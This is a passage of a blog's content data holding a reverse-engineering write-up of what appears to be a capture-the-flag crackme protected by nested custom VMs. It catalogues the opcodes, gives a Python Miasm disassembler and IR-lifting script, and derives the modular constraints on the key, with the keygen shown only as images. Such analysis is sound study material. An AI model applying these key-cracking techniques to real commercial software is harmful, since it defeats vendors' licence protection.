result back.\r\nUnlike other arithmetic operations, XOR does **not** apply modulo.\r\n\r\n![XOR](/images/posts/vmware/image-10.png)\r\n\r\n---\r\n\r\n AND Opcode\r\n\r\n```\r\nOpcode: 0x542010a0  \r\nHandler: 0x00001590\r\n```\r\n\r\nPerforms bitwise AND between two stack values and pushes the result.\r\n\r\n![AND](/images/posts/vmware/image-11.png)\r\n\r\n---\r\n\r\n RET Opcode\r\n\r\n```\r\nOpcode: 0xbdecfe55  \r\nHandler: 0x000017bb\r\n```\r\n\r\nReturns from a VM function by restoring the program counter from the Link Register (LR).\r\n\r\n![RET](/images/posts/vmware/image-12.png)\r\n\r\n---\r\n\r\n ABORT Opcode\r\n\r\n```\r\nOpcode: 0x41f93b4b  \r\nHandler: 0x000017d4\r\n```\r\n\r\nImmediately terminates execution by calling `exit(1)`.\r\nUsed for invalid execution paths.\r\n\r\n![ABORT](/images/posts/vmware/image-13.png)\r\n\r\n---\r\n\r\n PUSH_IMM Opcode\r\n\r\n```\r\nHandler: 0x000017ea\r\n```\r\n\r\nPushes a 32-bit immediate value (fetched from ROM) onto the VM stack.\r\n\r\n![PUSH_IMM](/images/posts/vmware/image-14.png)\r\n\r\n---\r\n\r\n JZ (Jump if Equal)\r\n\r\n```\r\nOpcode: 0x180bc12d  \r\nHandler: 0x00001866\r\n```\r\n\r\nPops two values from the stack.\r\nIf they are equal, the program counter is adjusted using a signed immediate offset.\r\n\r\n![JZ](/images/posts/vmware/image-15.png)\r\n\r\n---\r\n\r\n JNZ (Jump if Not Equal)\r\n\r\n```\r\nOpcode: 0x5a0f38fc  \r\nHandler: 0x000018f9\r\n```\r\n\r\nPops two values from the stack.\r\nIf they are **not** equal, PC is updated by a signed immediate offset.\r\n\r\n![JNZ](/images/posts/vmware/image-16.png)\r\n\r\n---\r\n\r\n FAIL Opcode\r\n\r\n```\r\nOpcode: 0x27497906  \r\nHandler: 0x0000198c\r\n```\r\n\r\nAnother hard failure instruction that immediately exits the program.\r\n\r\n![FAIL](/images/posts/vmware/image-17.png)\r\n\r\n---\r\n\r\n SET_MEM_PTR Opcode\r\n\r\n```\r\nOpcode: 0xba1116a9  \r\nHandler: 0x000019a2\r\n```\r\n\r\nUpdates the VM memory pointer, used for subsequent memory read/write instructions.\r\n\r\n![SET_MEMPTR](/images/posts/vmware/image-18.png)\r\n\r\n---\r\n\r\n CALL Opcode\r\n\r\n```\r\nOpcode: 0xfa83fa5e  \r\nHandler: 0x000019de\r\n```\r\n\r\nStores the current PC into the Link Register (LR) and jumps to a new address.\r\n\r\n![CALL](/images/posts/vmware/image-19.png)\r\n\r\n---\r\n\r\n## HALT Opcode\r\n\r\n```\r\nOpcode: 0x818cd6b5  \r\nHandler: 0x00001a1d\r\n```\r\n\r\nSets the exit code and terminates VM execution cleanly.\r\n\r\n![HALT](/images/posts/vmware/image-20.png)\r\n\r\n---\r\n\r\n## LOAD_REG Opcode\r\n\r\n```\r\nOpcode: 0x8d67bae1  \r\nHandler: 0x00001a64\r\n```\r\n\r\nLoads a 32-bit value from ROM into a register.\r\n\r\n![LOAD_REG](/images/posts/vmware/image-21.png)\r\n\r\n---\r\n\r\n## PUTCHAR Opcode\r\n\r\n```\r\nOpcode: 0xd1450d67  \r\nHandler: 0x00001abf\r\n```\r\n\r\nOutputs a character using `putchar()` and sets the VM `PUT_FLAG`.\r\n\r\n![PUTCHAR](/images/posts/vmware/image-22.png)\r\n\r\n---\r\n\r\n INC / DEC Register Opcodes\r\n\r\n INC\r\n\r\n```\r\nHandler: 0x00001b03\r\n```\r\n\r\n![INC](/images/posts/vmware/image-23.png)\r\n\r\n DEC\r\n\r\n```\r\nHandler: 0x00001b46\r\n```\r\n\r\n![DEC](/images/posts/vmware/image-24.png)\r\n\r\n---\r\n\r\n MOD Opcode\r\n\r\n```\r\nHandler: 0x00001724\r\n```\r\n\r\nPerforms modulo operation using a register and pushes the result onto the stack.\r\n\r\n![MOD](/images/posts/vmware/image-25.png)\r\n\r\n---\r\n\r\n POP_REG Opcode\r\n\r\n```\r\nHandler: 0x00001be5\r\n```\r\n\r\nPops a value from the stack into a register.\r\n\r\n![POP_REG](/images/posts/vmware/image-26.png)\r\n\r\n---\r\n\r\n SET_MEM_PTR Opcode\r\n\r\n```\r\nHandler: 0x00001c41\r\n```\r\n\r\nAdjusts internal VM memory pointers.\r\n\r\n![SET_MEM_PTR](/images/posts/vmware/image-27.png)\r\n\r\n---\r\n\r\n MEMSTORE Opcode\r\n\r\n```\r\nHandler: 0x00001ca4\r\n```\r\n\r\nStores a register value into VM memory at `VM_MEM_PTR`.\r\n\r\n![MEMSTORE](/images/posts/vmware/image-28.png)\r\n\r\n---\r\n\r\n MEMFETCH Opcode\r\n\r\n```\r\nHandler: 0x00001cf7\r\n```\r\n\r\nLoads a value from VM memory into a register.\r\n[MEMFETCH](/images/posts/vmware/image-29.png)\r\n\r\n\r\n\r\nTO put it simply here's the functioning of the VM \r\n\r\n![image](/images/posts/vmware/image-30.png)\r\n!\r\n\r\n\r\n\r\n\r\nAfter that i came across this article which was a very embedded emulator type VM which has also very much OP codes ;\r\n[https://miasm.re/blog/2016/09/03/zeusvm_analysis.html](https://miasm.re/blog/2016/09/03/zeusvm_analysis.html)\r\n\r\n\r\n### WHy miasm ??\r\n\r\nMiasm helps automate this process. After instructions are converted to IR, Miasm can symbolically execute them, meaning it treats inputs as unknown variables and follows all possible program paths automatically.\r\n\r\nIn this challenge, the binary does not directly compare user input. Instead, it runs everything inside a custom VM. Traditional tools struggle here because they do not understand the VM’s instruction set.\r\n\r\nBy implementing this VM as a custom architecture in Miasm, the VM bytecode can be executed symbolically instead of manually emulated. Miasm automatically tracks relationships between registers, stack values, and memory, and generates constraints on user input. These constraints can then be solved using SMT solvers.\r\n\r\nSo after reading some guides u need to make some files for misam , which like in the diagram below\r\n\r\n![miasm vm architecture layout](/images/posts/vmware/image-31.png)\r\n\r\n\r\nthe `regs.py` file is used to define the VM registers, `arch.py` ties the architecture together and describes basic properties like the program counter, and `sem.py` defines the actual semantics of each VM instruction\r\n\r\nI first needed the bytecode that the VM actually executes, because the main binary never runs it directly on the CPU. The program decodes some Base64 data at runtime and then passes the decoded result to the VM as its instruction stream. Instead of trying to analyze everything at once, I focused on grabbing this decoded data and saving it as a raw binary file. This became the input for Miasm. For the later VM layers, the VM itself loads another bytecode buffer from a ROM-like area in its memory, so I reused those unpacked buffers as well.  \r\n\r\n\r\nOnce I had the custom VM architecture wired up in Miasm, the next step was actually getting a disassembler working for the bytecode. I am not a Miasm wizard, so I did the simple thing: I read through the original writeup and kept Miasm’s own blog open as a reference, especially their “Playing with dynamic symbolic execution” article, just to understand how they build CFGs and IR and then simplify them:\r\nhttps://miasm.re/blog/2017/10/05/playing_with_dynamic_symbolic_execution.html#enhancing-coverage-breaking-a-crackme\r\nUsing that as a guide, I wrote a small Python script that feeds the VM bytecode into Miasm’s Machine(\"vmv\"), walks over all the basic blocks, looks for simple patterns like PUSH_REG; PUSH_IMM; JE to recover opcode values, and then saves out the control flow and simplified IR as .dot graphs. It is basically a hacked-together disassembler pass that does just enough for this challenge: discover opcodes for each nesting level, teach Miasm about them, then spit out IR I can actually reason about instead of staring at raw 32 bit words.\r\n\r\n\r\n```python\r\n\r\nfrom collections import defaultdict\r\nimport struct\r\nimport subprocess\r\n\r\nfrom miasm.analysis.machine import Machine\r\nfrom miasm.analysis.simplifier import (\r\n    IRCFGSimplifierCommon,\r\n    IRCFGSimplifierSSA,\r\n)\r\nfrom miasm.core.locationdb import LocationDB\r\nfrom miasm.core.utils import ExprInt\r\n\r\nfrom miasm.arch.vmv.regs import *\r\nfrom miasm.arch.vmv.arch import *\r\nimport miasm.arch.vmv.arch as arch_vmv\r\n\r\n\r\n#\r\n# Dispatcher offsets -> semantic opcode mapping\r\n# These offsets are stable across VM layers.\r\n#\r\nvm_handler_map = {\r\n    0xcb8: (\"EXIT_REG\",      reg_idx),\r\n    0xbcc: (\"DEC\",           reg_idx),\r\n    0xd70: (\"RET\",),\r\n    0x6e8: (\"MEMFETCH\",      reg_idx),\r\n    0xcd8: (\"CALL\",          imm32),\r\n    0x358: (\"PUTCHAR_REG\",   reg_idx),\r\n    0x444: (\"JMP\",           imm32),\r\n    0x980: (\"XOR\",),\r\n    0x8fc: (\"MUL\",),\r\n    0x770: (\"AND\",),\r\n    0xb68: (\"INC\",           reg_idx),\r\n    0x4ac: (\"JE\",            imm32),\r\n    0x67c: (\"MEMSTORE\",      reg_idx),\r\n    0x878: (\"ADD\",),\r\n    0x380: (\"PUSH_IMM\",      imm32),\r\n    0x3f0: (\"ROMFETCH\",      reg_idx),\r\n    0x3b0: (\"PUSH_REG\",      reg_idx),\r\n    0x594: (\"JNE\",           imm32),\r\n    0xa04: (\"PUTCHAR_IMM\",   putchar_imm32),\r\n    0xa44: (\"EXIT_IMM\",      imm32),\r\n    0xa54: (\"MEMSHIFT_IMM\",  imm32),\r\n    0xaa0: (\"MEMSHIFT_REG\",  reg_idx),\r\n    0xafc: (\"POP\",           reg_idx),\r\n    0xc30: (\"MOD\",           reg_idx),\r\n}\r\n\r\n\r\ndef dump_cfg(cfg, path):\r\n    \"\"\"Dump CFG/IR to .dot and render it using graphviz.\"\"\"\r\n    with open(path, \"w\") as f:\r\n        f.write(cfg.dot())\r\n\r\n    subprocess.call([\r\n        \"dot\", \"-Tpng\",\r\n        path,\r\n        \"-o\", path.replace(\".dot\", \".png\"),\r\n    ])\r\n\r\n\r\n#\r\n# Opcode discovery logic\r\n#\r\ndef vm_opcode_probe(mdis, block, _):\r\n    \"\"\"Inspect VM basic blocks for dispatcher patterns.\"\"\"\r\n\r\n    # Dispatcher entry:\r\n    #   PUSH_REG\r\n    #   PUSH_IMM \u003Copcode>\r\n    #   JE \u003Chandler>\r\n    #\r\n    lines = block.lines\r\n    if (\r\n        len(lines) == 3\r\n        and lines[0].name == \"PUSH_REG\"\r\n        and lines[1].name == \"PUSH_IMM\"\r\n        and lines[2].name == \"JE\"\r\n    ):\r\n        imm = lines[1].args[0]\r\n        dst = lines[2].args[0]\r\n\r\n        if isinstance(imm, ExprInt):\r\n            opcode = int(imm.arg)\r\n            handler = mdis.loc_db.get_location_offset(dst.loc_key)\r\n            vm_opcodes[opcode] = handler\r\n\r\n    #\r\n    # VM layer init block (xor constants)\r\n    #\r\n    if mdis.loc_db.get_location_offset(block.loc_key) == 0xe8:\r\n        arch_vmv.putchar_xorlist.append(\r\n            int(lines[0].args[0]) & 0xff\r\n        )\r\n        arch_vmv.reg_xorlist.append(\r\n            int(lines[2].args[0]) & 0xff\r\n        )\r\n\r\n\r\ndef register_vm_opcodes(opcodes, level):\r\n    \"\"\"Register decoded opcode values into Miasm.\"\"\"\r\n    print(f\"\\n[vm{level}] registering opcodes\")\r\n\r\n    for opcode, handler_off in opcodes.items():\r\n        name_def = vm_handler_map[handler_off]\r\n        mnemonic = name_def[0]\r\n        operands = name_def[1:] if len(name_def) > 1 else []\r\n\r\n        print(f\"  {hex(opcode)} -> {mnemonic}\")\r\n\r\n        if operands:\r\n            addop(mnemonic, [bs32(opcode), operands[0]])\r\n        else:\r\n            addop(mnemonic, [bs32(opcode)])\r\n\r\n\r\n#\r\n# Bytecode loader\r\n#\r\ndef load_vm_bytecodes():\r\n    \"\"\"Load initial and nested VM bytecode blobs.\"\"\"\r\n    blobs = []\r\n\r\n    with open(\"vmv_bytecode.bin\", \"rb\") as f:\r\n        blobs.append(f.read())\r\n\r\n    with open(\"vmv_nested_bytecode.bin\", \"rb\") as f:\r\n        while True:\r\n            hdr = f.read(4)\r\n            if not hdr:\r\n                break\r\n\r\n            count = struct.unpack(\"\u003CI\", hdr)[0]\r\n            blobs.append(f.read(count * 4))\r\n\r\n    return blobs\r\n\r\n\r\n#\r\n# Main analysis loop\r\n#\r\nmachine = Machine(\"vmv\")\r\nbytecodes = load_vm_bytecodes()\r\n\r\nprint(f\"[+] detected {len(bytecodes)} VM layers\")\r\n\r\nresults = []\r\nentry = 0x0\r\n\r\nfor level, bc in enumerate(bytecodes, start=1):\r\n    print(f\"[vm{level}] bytecode size: {len(bc) // 4:#x}\")\r\n\r\n    vm_opcodes = defaultdict(int)\r\n    loc_db = LocationDB()\r\n\r\n    mdis = machine.dis_engine(bc, loc_db=loc_db)\r\n    mdis.dis_block_callback = vm_opcode_probe\r\n\r\n    asmcfg = mdis.dis_multiblock(entry)\r\n    results.append((loc_db, asmcfg))\r\n\r\n    dump_cfg(\r\n        asmcfg,\r\n        f\"output/vmv_asmcfg{level}.dot\"\r\n    )\r\n\r\n    arch_vmv.nest_level += 1\r\n\r\n\r\n    if len(vm_opcodes) == 24:\r\n        register_vm_opcodes(vm_opcodes, level)\r\n\r\n\r\n#\r\n# IR lifting (final VM layer)\r\n#\r\nnl = 4\r\nloc_db, asmcfg = results[nl]\r\n\r\nira = machine.ira(loc_db)\r\nircfg = ira.new_ircfg_from_asmcfg(asmcfg)\r\n\r\ndump_cfg(ircfg, f\"output/vmv_ircfg{nl + 1}.dot\")\r\n\r\nentry_loc = loc_db.get_offset_location(entry)\r\n\r\nsimp = IRCFGSimplifierCommon(ira)\r\nsimp.simplify(ircfg, entry_loc)\r\ndump_cfg(ircfg, f\"output/vmv_ircfg_simp_common{nl + 1}.dot\")\r\n\r\nsimp = IRCFGSimplifierSSA(ira)\r\nsimp.simplify(ircfg, entry_loc)\r\ndump_cfg(ircfg, f\"output/vmv_ircfg_simp_ssa{nl + 1}.dot\")\r\n\r\n\r\n```\r\nAt some point while trying to hook my VM into Miasm, I ran into this error saying that miasm.arch.vmv.jit did not contain something called jitter_vmv. After some digging, I realized this wasn’t actually a VM bug but a Miasm integration issue. When Miasm loads a new architecture through machine.py, it assumes that a JIT (Just-In-Time execution) backend exists and tries to import it automatically. In my case, vmv/jit.py turned out to be completely empty, so there was nothing named jitter_vmv to import. Since my disassembly and analysis pipeline never used the JIT at all, the simplest fix was to remove the JIT-related import lines for vmv inside machine.py. This effectively told Miasm that the vmv architecture does not support JIT execution, which was totally fine for static disassembly and IR lifting.\r\n\r\nAfter fixing the JIT issue, Miasm failed again, this time complaining about a missing LifterModelCallVmv class in vmv/ira.py. This was another case of Miasm expecting a conventionally named class without checking whether it actually existed. I opened vmv/ira.py and found that it instead defined classes named ir_a_vmv_base and ir_a_vmv. Based on the existing Miasm architectures and how the lifter is usually named, it was clear that ir_a_vmv was the correct lifter to use. To fix this, I updated the vmv branch in machine.py to import ir_a_vmv instead of LifterModelCallVmv. Once this change was made, Miasm could successfully lift VM instructions into IR without looking for non-existent classes\r\n\r\nWith my knowledge , ill try to summarise how jitter the execution layer works :(\r\n\r\nMiasm has a component called **Jitter**, which is used to *execute* instructions after they have been translated into Miasm’s intermediate representation (IR). You can think of Jitter as a simple emulator that understands IR instead of raw machine code. It keeps track of things like registers, memory, and the current instruction pointer, and then steps through instructions one by one.\r\n\r\nAt the core of this system is a generic `Jitter` class, which provides common execution logic that works the same for every architecture. On top of that, Miasm defines architecture-specific subclasses such as `jitter_x86_64`, `jitter_arm`, or `jitter_mips32`. Each of these subclasses explains how instructions for that particular CPU should behave at runtime. This is why Miasm’s documentation shows a large inheritance diagram: many different architectures all extend the same base Jitter class.\r\n\r\n\r\n![image](/images/posts/vmware/image-32.png)\r\n\r\n\r\nJitter is also closely tied to **symbolic execution**. Instead of running instructions with real concrete values, Miasm can execute them symbolically, meaning registers and memory can hold expressions rather than actual numbers. As Jitter steps through instructions, it updates these symbolic expressions and builds constraints that describe how program inputs affect the program state. This is useful for exploring multiple execution paths, understanding key checks, or reasoning about conditions without needing a specific input. In short, symbolic execution uses Jitter as its execution engine, but replaces concrete values with symbolic ones.\r\n\r\n![image](/images/posts/vmware/image-33.png)\r\n\r\n\r\nEach layer produced an assembly-level CFG (*_asmcfg*.png), which shows the decoded VM instructions and their control flow, and for the final VM layer an IR-level CFG (*_ircfg*.png) was also generated\r\n![image](/images/posts/vmware/image-34.png)\r\n\r\nNg\r\n\r\n\r\nAfter setting up the custom disassembler, I began analyzing the generated assembly-level control flow graphs (CFGs) for each VM layer. These graphs show the decoded VM instructions and how control flows within each virtual machine. Since the challenge uses nested virtualization, examining these CFGs layer by layer helps understand how complexity is gradually peeled away until the real logic is exposed.\r\n\r\n\r\n\r\n![VM Layer 1 CFG](/images/posts/vmware/image-35.png)\r\n\r\n\r\nThe first VM layer is the largest and most complex. It is dominated by dispatcher logic: instruction fetch loops, register movement, memory initialization, and indirect jumps. At this stage, the VM mainly focuses on setting up the execution environment and preparing the next bytecode buffer. There are no meaningful input-dependent checks here, only infrastructure code required to emulate the VM.\r\n\r\n\r\n\r\n\r\n![VM Layer 2 CFG](/images/posts/vmware/image-36.png)\r\n\r\n\r\nThe second VM layer closely resembles the first. While some constants and register roles differ due to re-encoding, the overall structure remains the same: a large dispatcher loop with instruction handlers branching from it. \r\n\r\n\r\n\r\n\r\n![VM Layer 3 CFG](/images/posts/vmware/image-37.png)\r\n\r\n\r\nBy the third VM layer, the CFG begins to shrink slightly. While dispatcher logic is still clearly visible, there are fewer blocks and less overall noise. \r\n\r\n\r\n\r\n![VM Layer 4 CFG](/images/posts/vmware/image-38.png)\r\n\r\nAlthough a dispatcher is still present, the CFG is noticeably smaller and more structured. Many repetitive VM bookkeeping blocks disappear tho \r\n\r\n\r\n\r\n![VM Layer 5 CFG](/images/posts/vmware/image-39.png)\r\n\r\n\r\n The CFG is much smaller and no longer dominated by VM dispatch infrastructure. Instead, it consists of relatively straight-line code with arithmetic operations and branches based on computed values. \r\n\r\n\r\n\r\n![Final SSA IR CFG](/images/posts/vmware/image-40.png)\r\n\r\n\r\nThe VM abstraction is very less honestly and we can see the register data's etc . \r\n\r\n\r\n\r\n\r\nFrom the SSA graph, it becomes clear that the input key is read from the VM ROM buffer in four 32-bit chunks. These correspond to the 16-byte input split as input[0:4], input[4:8], input[8:12], and input[12:16]. Each chunk is processed independently through a sequence of arithmetic checks. The first and third chunks are multiplied by fixed constants and reduced modulo 0x7fffffff, with the result compared against the value 1. This directly translates into modular inverse equations. The second and fourth chunks are validated using two different modulo comparisons each, forming classic Chinese Remainder Theorem (CRT) constraints. \r\n\r\nOnly if all constraints succeed does execution reach the final block, which consists of a series of putchar calls that print the flag one character at a time.\r\n\r\n![image](/images/posts/vmware/image-41.png)\r\n\r\n\r\nSo i made a smol keygen \r\n\r\n\r\n![image](/images/posts/vmware/image-42.png)\r\n\r\n\r\n![image](/images/posts/vmware/image-43.png)\r\n\r\n\r\n\r\n### References\r\n\r\n* Miasm official blog and documentation\r\n  [https://miasm.re/blog/](https://miasm.re/blog/)\r\n\r\n* Miasm v0.1.0 release notes (IRCFG, SSA, symbolic execution improvements)\r\n  [https://miasm.re/blog/2018/12/20/release_v0_1_0.html](https://miasm.re/blog/2018/12/20/release_v0_1_0.html)\r\n\r\n* Tigress-based protection and virtualization examples\r\n  [https://github.com/JonathanSalwan/Tigress_protection](https://github.com/JonathanSalwan/Tigress_protection)\r\n\r\n* Dynamic Symbolic Execution with Miasm (crash course + crackme coverage)\r\n  [https://miasm.re/blog/2017/10/05/playing_with_dynamic_symbolic_execution.html](https://miasm.re/blog/2017/10/05/playing_with_dynamic_symbolic_execution.html)\r\n\r\n* Data flow analysis and dependency graphs in Miasm\r\n  [https://miasm.re/blog/2017/02/03/data_flow_analysis_depgraph.html](https://miasm.re/blog/2017/02/03/data_flow_analysis_depgraph.html)\r\n\r\n* Nanomite-protected binary analysis using Miasm symbolic execution\r\n  [https://doar-e.github.io/blog/2014/10/11/taiming-a-wild-nanomite-protected-mips-binary-with-symbolic-execution-no-such-crackme/](https://doar-e.github.io/blog/2014/10/11/taiming-a-wild-nanomite-protected-mips-binary-with-symbolic-execution-no-such-crackme/)\r\n\r\n* Deobfuscation of OLLVM-protected programs (Quarkslab)\r\n  [https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html](https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html)","src/content/blog/vmware.md","23b80bcb342fd2fd",{"html":752,"metadata":753},"\u003Cp>Running \u003Ccode>file\u003C/code> on the binary shows a standard ELF executable:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-1.png\" alt=\"file info\">\u003C/p>\n\u003Cp>Nothing unusual here\u003C/p>\n\u003Cp>When executed, the binary asks for user input. Supplying anything incorrect leads to an immediate failure response, with no visible comparison or transformation in plaintext:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-2.png\" alt=\"runtime input\">\u003C/p>\n\u003Cp>Opening the binary in Binary Ninja reveals that the validation logic is \u003Cstrong>not normal control flow\u003C/strong>. Instead, it looks like a \u003Cstrong>nested VM / emulator\u003C/strong>, where execution is handled through multiple small functions acting like opcode handlers:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-3.png\" alt=\"vm view\">\u003C/p>\n\u003Cp>Rather than direct comparisons, input seems to be processed through this interpreter.\u003C/p>\n\u003Cp>Below the opcode-handling logic are several \u003Cstrong>hardcoded byte arrays\u003C/strong> that resemble Base64-encoded data:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-4.png\" alt=\"b64 array 1\">\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-5.png\" alt=\"b64 array 2\">\u003C/p>\n\u003Cp>These are likely VM data or encrypted constants consumed by the interpreter rather than decoded directly in native code.\u003C/p>\n\u003Cp>The registers are 25 in count so we need to figure out the opcode for the instructions that the emulator will process.\u003C/p>\n\u003Cp>Ill use radare 2 for finding what each of the instrucions mean ;\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-6.png\" alt=\"image\">\u003C/p>\n\u003Cp>Before the virtual machine executes any bytecode, it initializes an opcode dispatch table. This is done through a helper function (fcn.00001238), which is repeatedly called during VM setup.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-7.png\" alt=\"image\">\u003C/p>\n\u003Cp>In my best attempts this would be like\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">entry \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> calloc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(opcode_entry));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">entry\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">opcode \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> opcode;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">entry\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">handler \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> handler;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">bucket \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#FFAB70\"> opcode_table\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#B392F0\">hash\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(opcode)];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">entry\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">next \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> bucket;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#FFAB70\">opcode_table\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#B392F0\">hash\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(opcode)] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> entry;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>It seems like it is indeed the dispatcher for the architecture\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-8.png\" alt=\"image\">\u003C/p>\n\u003Cp>After allocating the opcode table, the program registers every VM instruction by pairing:\u003C/p>\n\u003Cp>an encoded opcode value (32-bit constant in edi) ,a handler function (function pointer in rsi)\u003C/p>\n\u003Cp>So i’ll move onto the next function here which is\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[0x00001d44]\u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> s 0x000014cd\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[0x000014cd]\u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> pdf\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">ERROR:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> Cannot\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> find\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> function\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> at\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x000014cd\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[0x000014cd]\u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> af\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[0x000014cd]\u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> pdf\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            ; \u003C/span>\u003Cspan style=\"color:#B392F0\">DATA\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> XREF\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> from\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> main\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> @\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x1dde\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#B392F0\">r\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">┌\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 195:\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> fcn.000014cd\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (int64_t \u003C/span>\u003Cspan style=\"color:#9ECBFF\">arg1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> `\u003C/span>\u003Cspan style=\"color:#B392F0\">-\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> args(\u003C/span>\u003Cspan style=\"color:#B392F0\">rdi\u003C/span>\u003Cspan style=\"color:#9ECBFF\">) vars(\u003C/span>\u003Cspan style=\"color:#B392F0\">3:sp[0xc..0x20]\u003C/span>\u003Cspan style=\"color:#9ECBFF\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014cd\u003C/span>\u003Cspan style=\"color:#79B8FF\">      55\u003C/span>\u003Cspan style=\"color:#9ECBFF\">             push rbp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014ce\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      4889e5         mov rbp, rsp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014d1\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      48897de8       mov qword [var_18h], rdi    ; \u003C/span>\u003Cspan style=\"color:#B392F0\">arg1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014d5\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b45e8       mov rax, qword [var_18h]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">│\u003C/span>\u003Cspan style=\"color:#79B8FF\">           0x000014d9\u003C/span>\u003Cspan style=\"color:#9ECBFF\">      488b10         mov rdx, qword 